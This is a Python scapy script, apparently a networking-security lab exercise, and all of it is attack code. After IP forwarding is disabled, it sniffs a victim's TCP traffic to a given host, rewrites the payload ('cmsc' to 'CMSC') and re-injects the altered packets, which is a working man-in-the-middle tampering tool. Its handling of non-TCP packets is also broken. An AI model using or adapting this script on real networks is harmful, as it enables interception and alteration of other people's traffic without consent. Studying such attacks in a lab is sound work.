#!/usr/bin/env python3
# ensure that output of 'sysctl net.ipv4.ip_forward'  should be zero.
# set this value to zero by following command. NO SPACE before and after '=' sign.
# sysctl -w net.ipv4.ip_forward=0
# --------------------------------
# the program replaces any occurrent of cmsc with CMSC.
# -------------------------------
import sys
import re
from scapy.all import *

if len(sys.argv) != 3:
  print("Usage: sys.argv[0] <victim IP> <dstn IP>")
  exit();

def spoof_pkt(pkt):
  newpkt = IP(bytes(pkt[IP]))
  if newpkt.proto != 6:
      send(newpkt)
      newpkt.show()
  del(newpkt.chksum)
  del(newpkt.len)
  del(newpkt[TCP].payload)
  del(newpkt[TCP].chksum)
  if pkt[TCP].payload:
    msg = pkt[TCP].payload.load
    newmsg = msg.replace(b'cmsc', b'CMSC')
    spkt = newpkt/newmsg
    send(spkt)
    spkt.show()
  else:
      send(newpkt)
      newpkt.show()

# program has both the params
victim_ip = sys.argv[1]
dstn_ip = sys.argv[2]

template = 'inbound and tcp and (ip src {A} and ip dst {B})'
cap_filter = template.format(A=victim_ip, B=dstn_ip)
#print(cap_filter)
pkt = sniff(iface='eth0', filter=cap_filter, prn=spoof_pkt)
